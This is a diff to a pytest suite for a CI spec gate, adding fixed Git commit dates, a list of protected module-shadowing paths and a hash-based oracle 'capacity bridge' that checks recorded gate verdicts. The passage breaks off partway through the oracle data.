@@ -13,11 +13,18 @@ finding gives.
 """
 from __future__ import annotations
 
+import ast
 import datetime
+import hashlib
+import importlib.util
+import types
 import json
 import os
+import re
+import shutil
 import subprocess
 import sys
+from collections.abc import Callable
 from pathlib import Path
 
 import pytest
@@ -28,6 +35,7 @@ TODAY = datetime.date.today().isoformat()   # the head commit's date, which Last
 REPO = Path(__file__).resolve().parents[2]
 GATE = REPO / "scripts/gate/spec_gate.py"
 WORKFLOW = REPO / ".github/workflows/spec-gate.yml"
+RENDERER_HERE = (REPO / "scripts/maintenance/doc_inventory.py").is_file()
 
 CATALOG = "docs/product/02-FEATURE-CATALOG.md"
 REQUIREMENTS = "docs/product/01-PRODUCT-REQUIREMENTS.md"
@@ -38,6 +46,18 @@ BRANCH = "feature/feat-model-001-model-decisions"
 DONE = ["every model states its decision", "the registry test passes"]
 CODE = {"lib/model.py": "DECISION = 'direction'\n"}
 NOT_A_FEAT_BRANCH = "is not feature/<feat-id>-<slug> or fix/<feat-id>-<slug>"
+
+SOURCE_REVIEW_PROTECTED = (
+    "scripts/maintenance/doc_source_snapshot.py", "scripts/maintenance/docs_audit.py",
+    "tests/scripts/test_doc_source_snapshot.py", "tests/scripts/test_docs_audit.py",
+    "scripts/__init__.py", "scripts/maintenance/__init__.py", "scripts/gate/__init__.py",
+    "tests/__init__.py", "tests/scripts/__init__.py", "tests/conftest.py", "tests/scripts/conftest.py",
+    "scripts/maintenance/json.py", "scripts/maintenance/json/__init__.py", "scripts/json.py",
+    "json.py", "signal.py", "json/__init__.py", "scripts.py", "tests.py",
+    "json.pyc", "json/__init__.pyc", "json.so", "json.abi3.so",
+    "yaml.py", "yaml/__init__.py", "pytest.py", "pytest/__init__.py",
+    "scripts/maintenance/json.pyc", "scripts/maintenance/json.so", "tests/scripts/json.pyc",
+)
 
 CATALOG_TEXT = """\
 # Feature Catalog
@@ -119,8 +139,15 @@ def body(ticked: bool = False, spec_path: str = SPEC, plan_path: str | None = PL
     return "\n".join(links + [""] + [f"- [{box}] {item}" for item in DONE])
 
 
-def _git(cwd: Path, *args: str) -> str:
-    return subprocess.run(["git", *args], cwd=cwd, check=True,
+def _git(cwd: Path, *args: str, env: dict[str, str] | None = None) -> str:
+    # Fixture records use the collection day; real test commits must use that
+    # same day even when a long native suite crosses midnight. Explicit dates
+    # supplied by an individual test still take precedence over these defaults.
+    git_env = dict(os.environ)
+    git_env.setdefault("GIT_AUTHOR_DATE", f"{TODAY}T12:00:00+00:00")
+    git_env.setdefault("GIT_COMMITTER_DATE", f"{TODAY}T12:00:00+00:00")
+    git_env.update(env or {})
+    return subprocess.run(["git", *args], cwd=cwd, check=True, env=git_env,
                           capture_output=True, text=True).stdout.strip()
 
 
@@ -132,40 +159,71 @@ def write(repo: Path, path: str, text: str) -> None:
         p.chmod(0o755)   # a hook is executable unless a test takes that away
 
 
-@pytest.fixture
-def repo(tmp_path):
+def configure_fixture_git(root: Path) -> None:
+    """Only Git's exact default local config can receive the fixed fixture settings directly."""
+    default = (b"[core]\n\trepositoryformatversion = 0\n\tfilemode = true\n"
+               b"\tbare = false\n\tlogallrefupdates = true\n")
+    try:
+        if "GIT_CONFIG" in os.environ:
+            eligible = False
+        else:
+            path = root / _git(root, "rev-parse", "--git-path", "config")
+            eligible = (path == root / ".git/config" and not (root / ".git").is_symlink()
+                        and not path.is_symlink() and path.is_file() and path.read_bytes() == default)
+    except (OSError, subprocess.CalledProcessError):
+        eligible = False
+    if eligible:
+        with path.open("ab") as stream:
+            stream.write(b"[maintenance]\n\tautoDetach = false\n[gc]\n\tautoDetach = false\n"
+                         b"[user]\n\temail = t@example.com\n\tname = t\n[commit]\n\tgpgsign = false\n")
+        return
+    # Unknown templates/layouts retain Git's overwrite, include and multivalue-error semantics.
+    _git(root, "config", "maintenance.autoDetach", "false")
+    _git(root, "config", "gc.autoDetach", "false")
+    _git(root, "config", "user.email", "t@example.com")
+    _git(root, "config", "user.name", "t")
+    _git(root, "config", "commit.gpgsign", "false")
+
+
+def make_repo(root: Path):
     """`main` holds the gate, a catalog, requirements, one approved spec and its
     ready plan, and one code file. Tag `base` marks it; every change branches
     from there."""
-    _git(tmp_path, "init", "-q", "-b", "main")
-    _git(tmp_path, "config", "user.email", "t@example.com")
-    _git(tmp_path, "config", "user.name", "t")
-    _git(tmp_path, "config", "commit.gpgsign", "false")
-    write(tmp_path, "scripts/gate/spec_gate.py", GATE.read_text(encoding="utf-8"))
-    write(tmp_path, CATALOG, CATALOG_TEXT)
-    write(tmp_path, REQUIREMENTS, REQUIREMENTS_TEXT)
-    write(tmp_path, SPEC, spec())
-    write(tmp_path, PLAN, plan())
-    write(tmp_path, "lib/model.py", "DECISION = 'size'\n")
-    _git(tmp_path, "add", "-A")
-    _git(tmp_path, "commit", "-q", "-m", "base")
-    _git(tmp_path, "tag", "base")
-    return tmp_path
+    _git(root, "init", "-q", "-b", "main")
+    configure_fixture_git(root)
+    write(root, "scripts/gate/spec_gate.py", GATE.read_text(encoding="utf-8"))
+    write(root, CATALOG, CATALOG_TEXT)
+    write(root, REQUIREMENTS, REQUIREMENTS_TEXT)
+    write(root, SPEC, spec())
+    write(root, PLAN, plan())
+    write(root, "lib/model.py", "DECISION = 'size'\n")
+    _git(root, "add", "-A")
+    _git(root, "commit", "-q", "-m", "base")
+    _git(root, "tag", "base")
+    return root
+
+
+@pytest.fixture
+def repo(tmp_path):
+    return make_repo(tmp_path)
 
 
 def gate(repo: Path, *args: str, **env: str) -> subprocess.CompletedProcess:
     # Only what the hook and the workflow pass in: nothing leaks from the shell running pytest.
     # (stocks#1205 r4122021112: PYTEST_CURRENT_TEST would tell a gate it is under test)
     inherited = {k: v for k, v in os.environ.items() if not k.startswith(("PR_", "SPEC_GATE_", "GIT_", "PYTEST_"))}
-    return subprocess.run([sys.executable, "scripts/gate/spec_gate.py", *args], cwd=repo,
+    capacity_bridge_before_dispatch(args, env)   # capacity bridge: oracle and pair guard, a no-op outside its eight functions
+    result = subprocess.run([sys.executable, "scripts/gate/spec_gate.py", *args], cwd=repo,
                           env={**inherited, **env}, capture_output=True, text=True)
+    capacity_bridge_after_dispatch(result)
+    return result
 
 
 def cells(line: str) -> list[str]:
     return [c.strip() for c in line.strip().strip("|").split("|")]
 
 
-def on_base(repo: Path, files: dict[str, str | None]) -> None:
+def on_base(repo: Path, files: dict[str, str | None], then=None) -> None:
     """Commit `files` on main and move the `base` tag there: what a change is measured against.
     The catalog row and the approved spec are read from the base, never from the change."""
     _git(repo, "reset", "-q", "--hard")
@@ -176,12 +234,14 @@ def on_base(repo: Path, files: dict[str, str | None]) -> None:
             (repo / path).unlink()
         else:
             write(repo, path, text)
+    if then is not None:
+        then(repo)
     _git(repo, "add", "-A")
     _git(repo, "commit", "-q", "-m", "on base")
     _git(repo, "tag", "-f", "base")
 
 
-def pr(repo: Path, branch: str, files: dict[str, str | None], **env: str) -> subprocess.CompletedProcess:
+def pr(repo: Path, branch: str, files: dict[str, str | None], then=None, **env: str) -> subprocess.CompletedProcess:
     """A pull request from `branch`, cut from base, that writes `files` (None deletes one),
     judged the way the spec-gate workflow judges it."""
     _git(repo, "reset", "-q", "--hard")
@@ -192,10 +252,41 @@ def pr(repo: Path, branch: str, files: dict[str, str | None], **env: str) -> sub
             (repo / path).unlink()
         else:
             write(repo, path, text)
+    if then is not None:
+        then(repo)
     _git(repo, "add", "-A")
     _git(repo, "commit", "-q", "-m", f"change on {branch}")
+    if _CAPACITY_BRIDGE["active"] is not None:   # capacity bridge: the caller vector this case dispatches
+        _CAPACITY_BRIDGE["vector"] = capacity_bridge_vector(branch, files)
     # (stocks#1205 r4127577496: Actions passes two 40-character shas, so the suite does too)
-    return gate(repo, "--pr", _git(repo, "rev-parse", "base"), _git(repo, "rev-parse", "HEAD"), **{"PR_HEAD_REF": branch, **env})
+    base, head = base_and_head(repo)
+    return gate(repo, "--pr", base, head, **{"PR_HEAD_REF": branch, **env})
+
+
+def test_fixture_commit_dates_survive_midnight_and_preserve_explicit_dates(repo, monkeypatch):
+    fixture_day = (datetime.date.today() - datetime.timedelta(days=1)).isoformat()
+    monkeypatch.setitem(globals(), "TODAY", fixture_day)
+    meta = {"PR_TITLE": "FEAT-MODEL-001: midnight fixture", "PR_BODY": body(ticked=True),
+            "PR_NUMBER": "42", "PR_DRAFT": "false"}
+    recorded = {**CODE, PLAN: plan(pr=42)}
+    row = CATALOG_TEXT.replace("| Models | Production | unknown | none |",
+                               f"| Models | Production | {fixture_day} | #42 |")
+    accepted = pr(repo, BRANCH, {**recorded, CATALOG: row}, **meta)
+    assert accepted.returncode == 0, accepted.stdout + accepted.stderr
+    assert _git(repo, "show", "-s", "--format=%as|%cs", "HEAD") == f"{fixture_day}|{fixture_day}"
+    wrong_day = (datetime.date.fromisoformat(fixture_day) + datetime.timedelta(days=1)).isoformat()
+    refused = pr(repo, BRANCH, {**recorded, CATALOG: row.replace(fixture_day, wrong_day)}, **meta)
+    assert refused.returncode == 1 and "head commit date" in refused.stdout, refused.stdout
+    assert fixture_day in refused.stdout and wrong_day in refused.stdout
+
+    monkeypatch.setenv("GIT_AUTHOR_DATE", "2001-02-03T12:00:00+00:00")
+    monkeypatch.setenv("GIT_COMMITTER_DATE", "2002-04-05T12:00:00+00:00")
+    _git(repo, "commit", "-q", "--allow-empty", "-m", "explicit inherited fixture dates")
+    assert _git(repo, "show", "-s", "--format=%as|%cs", "HEAD") == "2001-02-03|2002-04-05"
+    _git(repo, "commit", "-q", "--allow-empty", "-m", "explicit per-call fixture dates",
+         env={"GIT_AUTHOR_DATE": "2003-06-07T12:00:00+00:00",
+              "GIT_COMMITTER_DATE": "2004-08-09T12:00:00+00:00"})
+    assert _git(repo, "show", "-s", "--format=%as|%cs", "HEAD") == "2003-06-07|2004-08-09"
 
 
 def test_the_gate_cannot_be_edited_outside_chore_and_ci_runs_the_base_copy(repo):
@@ -220,6 +311,32 @@ def test_the_gate_cannot_be_edited_outside_chore_and_ci_runs_the_base_copy(repo)
         checkout = next(s for s in job["steps"] if s.get("uses", "").startswith("actions/checkout"))
         assert checkout["with"]["ref"] == "${{ github.event.pull_request.base.sha }}"
         assert not any("python3 scripts/gate/export_model_registry.py" in s.get("run", "") for s in job["steps"])
+
+
+def test_source_review_inputs_and_startup_dependencies_belong_to_cicd(repo):
+    """The actual gate refuses unrelated-feature edits, including new shadow slots."""
+    catalog = CATALOG_TEXT.replace("| [FEAT-DATA-001](#feat-data-001) | Data | Production | unknown | none |",
+                                   "| [FEAT-DATA-001](#feat-data-001) | Data | Production | unknown | none |\n| FEAT-CICD-001 | Delivery | Production | unknown | none |")
+    on_base(repo, {CATALOG: catalog})
+    for path in SOURCE_REVIEW_PROTECTED:
+        refused = pr(repo, BRANCH, {path: "LOCAL = 'benign ownership control'\n"},
+                     PR_TITLE="FEAT-MODEL-001: local source review ownership", PR_DRAFT="true")
+        assert refused.returncode == 1 and "belong to FEAT-CICD-001" in refused.stdout, (path, refused.stdout)
+
+
+def test_source_review_input_legitimate_cicd_change_passes_actual_gate(repo):
+    branch = "feature/feat-cicd-001-source-review-inputs"
+    cicd_spec = SPEC.replace("model-decisions", "source-review-inputs")
+    cicd_plan = PLAN.replace("model-decisions", "source-review-inputs")
+    on_base(repo, {
+        CATALOG: CATALOG_TEXT.replace("| [FEAT-DATA-001](#feat-data-001) | Data | Production | unknown | none |",
+                                     "| [FEAT-DATA-001](#feat-data-001) | Data | Production | unknown | none |\n| FEAT-CICD-001 | Delivery | Production | unknown | none |"),
+        cicd_spec: spec(feat_id="FEAT-CICD-001"),
+    })
+    accepted = pr(repo, branch, {cicd_plan: plan(feat_id="FEAT-CICD-001", branch=branch, spec=cicd_spec),
+                                "scripts/maintenance/doc_source_snapshot.py": "LOCAL = 'benign CICD-owned control'\n"},
+                  PR_TITLE="FEAT-CICD-001: source review input ownership", PR_DRAFT="true")
+    assert accepted.returncode == 0, accepted.stdout + accepted.stderr
 
 
 def test_deploy_and_config_files_are_gated(repo):
@@ -1184,6 +1301,373 @@ def test_a_ticked_done_when_item_may_not_defer_its_work(repo):
         assert r.returncode == 1 and "defers its work" in r.stdout, (phrase, r.stdout)
 
 
+# ---------------------------------------------------------------------------------------------
+# Capacity fixture bridge (docs/superpowers/specs/2026-10-13-feat-cicd-001-capacity-fixture-bridge.md).
+#
+# The eight capacity-bearing functions below keep their historical `$/run × runs/day × 30:` or bare
+# `30:` carrier and carry an explicit same-value `Cost:` after it on the same line, so the separately
+# approved strict Cost parser can later pass this unchanged suite. The gate under test is byte-identical
+# to main: nothing here reads the gate's labels or verdicts. CAPACITY_BRIDGE_ORACLE is a capture of
+# every original case those functions dispatched through the real CLI on the BASE below, before any
+# fixture changed. For each dispatched case the guard in gate() compares the actual caller vector and
+# the PR body (after reversing only the Cost addition) with that oracle BEFORE the subprocess, and the
+# verdict after it; the per-function finalizer proves the whole original sequence ran, in order, once.
+# Normalised: the two 40-hex `--pr` operands, and the suite's TODAY (the generated catalog-review date)
+# inside fixture files, bodies and reason lines (counts recorded for files and bodies). Nothing else is
+# normalised or sorted.
+class CapacityFixtureEquivalenceError(AssertionError):
+    """A bridged capacity case differs from its BASE oracle, or its carriers are not a same-value pair."""
+
+
+CAPACITY_BRIDGE_BASE = {
+    "main": "1fb97576cd41d9ac601888f9507cd77375922a31",
+    "suite_blob": "d486f304cdb2caec316f2f1a5900b6dba35613f1",
+    "gate_blob": "ffb1ada8efef5777e1248241bd38b68ffaa2d23a",
+    "captured": "2026-11-04",
+}
+# A legacy cost carrier: the full formula label or a bare `30:` that is not part of another token.
+# Its value runs to the Cost carrier on the same line, the end of the line or the end of the body.
+CAPACITY_BRIDGE_LEGACY = re.compile(r"(\$/run \u00d7 runs/day \u00d7 30|(?<![\w$#:])30):([^\n]*?)(?= \u00b7 Cost:|\n|$)")
+CAPACITY_BRIDGE_COST_PREFIX = " \u00b7 Cost:"
+# The only diagnostic compatibility the spec allows: the final cost label of a capacity message spelt
+# `Cost` instead of `30`, which is what the strict Cost gate prints for the same case.
+CAPACITY_BRIDGE_LABEL_ALTERNATIVES = ((", 30 blank", ", Cost blank"), (", 30;", ", Cost;"))
+_CAPACITY_BRIDGE = {"active": None, "seq": 0, "dispatched": 0, "vector": None}
+
+
+def capacity_bridge_today_hash(text: str) -> tuple[str, int]:
+    """sha256 of `text` with the suite's TODAY replaced by `{TODAY}`, and how many fields that was."""
+    return hashlib.sha256(text.replace(TODAY, "{TODAY}").encode("utf-8")).hexdigest(), text.count(TODAY)
+
+
+def capacity_bridge_vector(branch: str, files: dict[str, str | None]) -> tuple[tuple[str, ...], str]:
+    """The caller vector of a pr() case: its paths and one identity over branch, paths and contents."""
+    rows = []
+    for name in sorted(files):
+        text = files[name]
+        if text is None:
+            rows.append(f"{name}\t-\t0")
+        else:
+            digest, today = capacity_bridge_today_hash(text)
+            rows.append(f"{name}\t{digest}\t{today}")
+    return tuple(sorted(files)), hashlib.sha256((branch + "\n" + "\n".join(rows)).encode("utf-8")).hexdigest()
+
+
+def capacity_bridge_split(body: str | None) -> tuple[str | None, tuple[str, ...]]:
+    """(the body with every Cost carrier removed, the legacy carrier values in order).
+
+    Refuses, before any gate subprocess, a legacy carrier without its Cost carrier immediately after
+    it, a Cost carrier whose value differs from the legacy value, a second Cost carrier on the line,
+    and a Cost carrier that no legacy carrier precedes. A missing legacy carrier stays missing: the
+    bridge adds no helpful default."""
+    if body is None:
+        return None, ()
+    legacy, pieces, pos = [], [], 0
+    for m in CAPACITY_BRIDGE_LEGACY.finditer(body):
+        value, end = m.group(2).strip(), m.end()
+        if not body.startswith(CAPACITY_BRIDGE_COST_PREFIX, end):
+            raise CapacityFixtureEquivalenceError(f"legacy carrier {m.group(0).strip()!r} has no Cost carrier immediately after it")
+        stop = body.find("\n", end)
+        stop = len(body) if stop < 0 else stop
+        cost = body[end + len(CAPACITY_BRIDGE_COST_PREFIX):stop].strip()
+        if cost != value:
+            raise CapacityFixtureEquivalenceError(f"Cost carrier {cost!r} differs from legacy carrier value {value!r}")
+        legacy.append(value)
+        pieces.append(body[pos:end])
+        pos = stop
+    pieces.append(body[pos:])
+    reversed_body = "".join(pieces)
+    if re.search(r"\bCost:", reversed_body):
+        raise CapacityFixtureEquivalenceError("a Cost carrier stands without a legacy carrier before it on its line")
+    return reversed_body, tuple(legacy)
+
+
+def capacity_bridge_activate(name: str | None) -> None:
+    _CAPACITY_BRIDGE.update(active=name, seq=0, vector=None)
+
+
+def capacity_bridge_consumed() -> tuple[int, int]:
+    """(cases dispatched so far, cases the BASE oracle holds) for the active function."""
+    return _CAPACITY_BRIDGE["seq"], len(CAPACITY_BRIDGE_ORACLE[_CAPACITY_BRIDGE["active"]])
+
+
+def capacity_bridge_before_dispatch(args: tuple[str, ...], env: dict[str, str]) -> None:
+    """Compare the case about to be dispatched with the next BASE oracle case; raise before the gate runs."""
+    name = _CAPACITY_BRIDGE["active"]
+    if name is None:
+        return
+    vector, _CAPACITY_BRIDGE["vector"] = _CAPACITY_BRIDGE["vector"], None
+    cases, k = CAPACITY_BRIDGE_ORACLE[name], _CAPACITY_BRIDGE["seq"]
+    if k >= len(cases):
+        raise CapacityFixtureEquivalenceError(f"{name}: case {k + 1} is beyond the {len(cases)} BASE cases")
+    shape = tuple("SHA" if re.fullmatch(r"[0-9a-f]{40}", a) else a for a in args)
+    if shape != ("--pr", "SHA", "SHA"):
+        raise CapacityFixtureEquivalenceError(f"{name} case {k + 1}: unexpected gate arguments {shape!r}")
+    reversed_body, carriers = capacity_bridge_split(env.get("PR_BODY"))
+    digest, today = (None, 0) if reversed_body is None else capacity_bridge_today_hash(reversed_body)
+    actual = (tuple(sorted((key, value) for key, value in env.items() if key != "PR_BODY")),
+              None if vector is None else vector[0], None if vector is None else vector[1], digest, today, carriers)
+    expected = cases[k][:6]
+    if actual != expected:
+        fields = ("env", "files", "files identity", "body identity", "body date fields", "legacy carriers")
+        diff = "; ".join(f"{f}: {a!r} != BASE {e!r}" for f, a, e in zip(fields, actual, expected) if a != e)
+        raise CapacityFixtureEquivalenceError(f"{name} case {k + 1} differs from the BASE oracle: {diff}")
+    _CAPACITY_BRIDGE["seq"] = k + 1
+
+
+def capacity_bridge_reasons(stdout: str) -> tuple[str, ...]:
+    """The gate's reason lines, with the suite's TODAY (a generated catalog-review date) as `{TODAY}`."""
+    return tuple(line.replace(TODAY, "{TODAY}") for line in stdout.splitlines() if line.startswith(" - "))
+
+
+def capacity_bridge_alternative(line: str) -> str:
+    for old, new in CAPACITY_BRIDGE_LABEL_ALTERNATIVES:
+        if old in line:
+            return line.replace(old, new, 1)
+    return line
+
+
+def capacity_bridge_after_dispatch(result: subprocess.CompletedProcess) -> None:
+    """The dispatched case keeps its BASE verdict: returncode and reasons, the cost label spelt either way."""
+    name = _CAPACITY_BRIDGE["active"]
+    if name is None:
+        return
+    _CAPACITY_BRIDGE["dispatched"] += 1
+    expected = CAPACITY_BRIDGE_ORACLE[name][_CAPACITY_BRIDGE["seq"] - 1]
+    reasons = capacity_bridge_reasons(result.stdout)
+    alternative = tuple(capacity_bridge_alternative(line) for line in expected[7])
+    if result.returncode != expected[6] or reasons not in (expected[7], alternative):
+        raise CapacityFixtureEquivalenceError(f"{name} case {_CAPACITY_BRIDGE['seq']}: verdict {result.returncode} "
+                                              f"{reasons!r} differs from BASE {expected[6]} {expected[7]!r}")
+
+
+CAPACITY_BRIDGE_FUNCTIONS = (
+    "test_a_workload_change_carries_its_capacity_numbers",
+    "test_the_pr_body_contract_is_read_as_rendered_in_every_form",
+    "test_capacity_values_are_numbers",
+    "test_contract_commands_run_and_policy_documents_keep_their_ids",
+    "test_lockfiles_twin_workflows_pins_at_step_one_and_ownership_are_the_contract",
+    "test_html_blocks_in_bodies_registry_prose_and_catalog_columns_are_the_contract",
+    "test_indented_headings_and_less_indented_fence_closers_render_as_gfm_renders_them",
+    "test_truthy_calls_decorators_yaml_skill_names_canvas_fields_manifest_scripts_and_rendered_status",
+)
+CAPACITY_BRIDGE_CASES = 155   # gate invocations the eight functions made on BASE, captured once
+
+
+def capacity_bridge_dispatched() -> int:
+    return _CAPACITY_BRIDGE["dispatched"]
+
+
+def capacity_bridge_refused(repo: Path, name: str, originals: tuple[str, ...], files: dict[str, str | None],
+                            title: dict[str, str], stage: int, text: str, mutated_files: dict[str, str | None] | None = None) -> str:
+    """Replay the valid cases before `stage`, then dispatch `text` there: refused, zero subprocesses."""
+    capacity_bridge_activate(name)
+    for original in originals[:stage - 1]:
+        pr(repo, BRANCH, files, **title, PR_BODY=original)
+    before = capacity_bridge_dispatched()
+    with pytest.raises(CapacityFixtureEquivalenceError) as info:
+        pr(repo, BRANCH, files if mutated_files is None else mutated_files, **title, PR_BODY=text)
+    assert capacity_bridge_dispatched() == before, "a refused case reached the gate subprocess"
+    return str(info.value)
+
+
+@pytest.fixture(autouse=True)
+def capacity_bridge_guard(request):
+    """Per-function finalizer for the eight bridged functions: every BASE case dispatched, in order, once."""
+    name = getattr(request.node, "originalname", None) or request.node.name
+    if name not in CAPACITY_BRIDGE_ORACLE:
+        yield
+        return
+    capacity_bridge_activate(name)
+    try:
+        yield
+        consumed, expected = capacity_bridge_consumed()
+    finally:
+        capacity_bridge_activate(None)
+    assert consumed == expected, f"{name} dispatched {consumed} of its {expected} BASE cases"
+
+
+# One tuple per original case, in dispatch order:
+# (env name/value pairs except PR_BODY, sorted; files; files identity; body identity; body date fields;
+#  legacy carrier values; returncode; reason lines). `files` and its identity are None for the one case
+# that calls gate() directly; body identity is None when no PR_BODY was passed.
+CAPACITY_BRIDGE_ORACLE = {
+    'test_a_workload_change_carries_its_capacity_numbers': (
+        ((('PR_HEAD_REF', 'feature/feat-model-001-model-decisions'), ('PR_TITLE', 'FEAT-MODEL-001: x')), ('gcp/model_job.py', 'lib/model.py'), 'e565c81ec3816cbb67851dcc222bd81d56195520288d51e887be66be594b0286', '9feb9bb8df1239244c2a6d234be7e2fa623ba0fc1f1a5321ddd051deefc2d957', 0, ('',), 1, (" - PR body's Capacity section leaves Volume, Velocity, Wall-clock, 30 blank; give the numbers, or write 'n/a: <why no workload runs differently>'",)),
+        ((('PR_HEAD_REF', 'feature/feat-model-001-model-decisions'), ('PR_TITLE', 'FEAT-MODEL-001: x')), ('gcp/model_job.py', 'lib/model.py'), 'e565c81ec3816cbb67851dcc222bd81d56195520288d51e887be66be594b0286', '3aebeed7c12b17af436a7037ad1c39d973bea27239738d6f75bc0c99cd8c6b92', 0, (), 1, (' - PR body needs a Capacity section: the change touches a workload (gcp/model_job.py)',)),
+        ((('PR_HEAD_REF', 'feature/feat-model-001-model-decisions'), ('PR_TITLE', 'FEAT-MODEL-001: x')), ('gcp/model_job.py', 'lib/model.py'), 'e565c81ec3816cbb67851dcc222bd81d56195520288d51e887be66be594b0286', '68c3ab6ed24ddffdaf3263ebaa9794931a8dacd4cb2b7e12fe59298a7508623a', 0, ('$0.01',), 0, ()),
+        ((('PR_HEAD_REF', 'feature/feat-model-001-model-decisions'), ('PR_TITLE', 'FEAT-MODEL-001: x')), ('gcp/model_job.py', 'lib/model.py'), 'e565c81ec3816cbb67851dcc222bd81d56195520288d51e887be66be594b0286', '4d87c40543d67f8e5788b7d4b538be65cfdd1b224f7334d1407a03cbc2ee01b0', 0, (), 0, ()),
+        ((('PR_HEAD_REF', 'feature/feat-model-001-model-decisions'), ('PR_TITLE', 'FEAT-MODEL-001: x')), ('gcp/model_job.py', 'lib/model.py'), 'e565c81ec3816cbb67851dcc222bd81d56195520288d51e887be66be594b0286', '5497d7231aafde6c0adb3eb47386a9f89dc72dfaa00db3b03fc86175b00fa3a5', 0, ('$0.01',), 0, ()),
+        ((('PR_HEAD_REF', 'feature/feat-model-001-model-decisions'), ('PR_TITLE', 'FEAT-MODEL-001: x')), ('lib/model.py',), '41fb63ef08e25e0fbcd324a1d943f84230530ce2fd2189cce8e3ecbf4584b5f0', '3aebeed7c12b17af436a7037ad1c39d973bea27239738d6f75bc0c99cd8c6b92', 0, (), 0, ()),
+        ((('PR_HEAD_REF', 'chore/gate-workflow'),), ('.github/workflows/spec-gate.yml',), '8eddc3b691aaec2af763ffa59aed715ebe2f7e331ed0ac413ed8ef6136413d26', 'de4cddb51d1b15d964d8d10d4c9d8cbb9f715e6d2034231f21e268e2b0096882', 0, (), 1, (' - PR body needs a Capacity section: the change touches a workload (.github/workflows/spec-gate.yml)',)),
+        ((('PR_HEAD_REF', 'chore/gate-workflow'),), ('.github/workflows/spec-gate.yml',), '8eddc3b691aaec2af763ffa59aed715ebe2f7e331ed0ac413ed8ef6136413d26', '7b00fd25bf9f3f04d9f330b1507609699eeabf86da6db096e1e24c33e5b95b71', 0, (), 0, ()),
+        ((('PR_HEAD_REF', 'docs/cleanup'),), ('docs/product/02-FEATURE-CATALOG.md',), '62b8cba8320a0c93e904898fc4ff7629dd1e17a7e888cb1a251281950859d32a', None, 0, (), 1, (" - docs/product/02-FEATURE-CATALOG.md: the gate's entrypoints and policy documents cannot be removed by a change; retiring the gate is a decision taken on main, not in a branch",)),
+        ((('PR_HEAD_REF', 'chore/gate-workflow'),), ('.github/workflows/spec-gate.yml',), '517912437c881f6f8131f218722b2a3e6d3e1db6f75c857e5f872f7b996d1485', '424d56fa4c538ec662d8adf3b9676565c60372b7a212ec9b3b4fb1d5f3c2bd8b', 0, (), 1, (" - .github/workflows/spec-gate.yml: the gate's entrypoints and policy documents cannot be removed by a change; retiring the gate is a decision taken on main, not in a branch",)),
+        ((('PR_HEAD_REF', 'chore/gate-workflow'),), ('.githooks/pre-commit',), 'd8d8928f1940160f97bb4123be8e3ab95ba082540d6ff3b188629353703e87db', '424d56fa4c538ec662d8adf3b9676565c60372b7a212ec9b3b4fb1d5f3c2bd8b', 0, (), 1, (" - .githooks/pre-commit: the gate's entrypoints and policy documents cannot be removed by a change; retiring the gate is a decision taken on main, not in a branch",)),
+        ((('PR_HEAD_REF', 'chore/gate-workflow'),), ('.github/workflows/registry-check.yml',), '42f42f451add11b40e6518b32aa103b3877036a13f66d8be03c0072b70cc3306', '424d56fa4c538ec662d8adf3b9676565c60372b7a212ec9b3b4fb1d5f3c2bd8b', 0, (), 1, (' - .github/workflows/registry-check.yml: no longer executes 3 step(s) the gate depends on (\'python3 -m py_compile "$gate"\' and more); a command in a comment, an echo, an unused scalar or a step an `if:` may skip does not count. The gate\'s workflows keep their checks',)),
+        ((('PR_HEAD_REF', 'chore/gate-workflow'),), ('.github/workflows/registry-check.yml',), '19b4cffd625164c442eae1759a77150679130d78aab028abc87f1b8d8d37d196', '424d56fa4c538ec662d8adf3b9676565c60372b7a212ec9b3b4fb1d5f3c2bd8b', 0, (), 1, (' - .github/workflows/registry-check.yml: no longer executes 3 step(s) the gate depends on (\'python3 -m py_compile "$gate"\' and more); a command in a comment, an echo, an unused scalar or a step an `if:` may skip does not count. The gate\'s workflows keep their checks',)),
+        ((('PR_HEAD_REF', 'chore/gate-workflow'),), ('.github/workflows/registry-check.yml',), '5e27b15c58243233c646582261e50699517102f7f836f5d58093941e6baef47b', '424d56fa4c538ec662d8adf3b9676565c60372b7a212ec9b3b4fb1d5f3c2bd8b', 0, (), 0, ()),
+        ((('PR_HEAD_REF', 'chore/gate-workflow'),), ('.github/workflows/spec-gate.yml-backdoor.yaml',), '92eb784c1f05ed46c1bc75900d646ed3ea975177f7b9416593e3e461928662e3', '424d56fa4c538ec662d8adf3b9676565c60372b7a212ec9b3b4fb1d5f3c2bd8b', 0, (), 1, (" - branch 'chore/gate-workflow' changes 1 gated file(s) (.github/workflows/spec-gate.yml-backdoor.yaml) but is not feature/<feat-id>-<slug> or fix/<feat-id>-<slug>.", " - docs/ carries documentation only; chore/ covers dependency manifests (dependency fields only), lockfiles and the gate's own files; anything else needs a FEAT-ID branch with an approved spec and a plan.")),
+        ((('PR_HEAD_REF', 'chore/gate-workflow'),), ('scripts/gate/helper.py',), '628bc8051929eae3f79357d565c00fd73074ab7ee80852283c4bbfa9feedf252', None, 0, (), 1, (" - branch 'chore/gate-workflow' changes 1 gated file(s) (scripts/gate/helper.py) but is not feature/<feat-id>-<slug> or fix/<feat-id>-<slug>.", ' - scripts/gate/helper.py: scripts/gate/ holds scripts/gate/spec_gate.py and scripts/gate/export_model_registry.py and nothing else; a module beside them would shadow an import of the gate', " - docs/ carries documentation only; chore/ covers dependency manifests (dependency fields only), lockfiles and the gate's own files; anything else needs a FEAT-ID branch with an approved spec and a plan.")),
+        ((('PR_HEAD_REF', 'chore/deps'),), ('docs/product/01-PRODUCT-REQUIREMENTS.md',), '209423f92f57b54113c79ef4c6255a510580fef516ae957b070fa4db4bf443bd', None, 0, (), 1, (" - branch 'chore/deps' changes 1 gated file(s) (docs/product/01-PRODUCT-REQUIREMENTS.md) but is not feature/<feat-id>-<slug> or fix/<feat-id>-<slug>.", " - docs/ carries documentation only; chore/ covers dependency manifests (dependency fields only), lockfiles and the gate's own files; anything else needs a FEAT-ID branch with an approved spec and a plan.")),
+        ((('PR_HEAD_REF', 'bot/superpowers-weekly'),), ('.claude/skills/brainstorming/SKILL.md', 'docs/notes.md'), 'c4c9b6f42cab6e83431680d24fe465b256fa9ad9a51dfdb6584a6657a882c99f', None, 0, (), 1, (" - branch 'bot/superpowers-weekly' changes 1 gated file(s) (docs/notes.md) but is not feature/<feat-id>-<slug> or fix/<feat-id>-<slug>.", " - docs/ carries documentation only; chore/ covers dependency manifests (dependency fields only), lockfiles and the gate's own files; anything else needs a FEAT-ID branch with an approved spec and a plan.")),
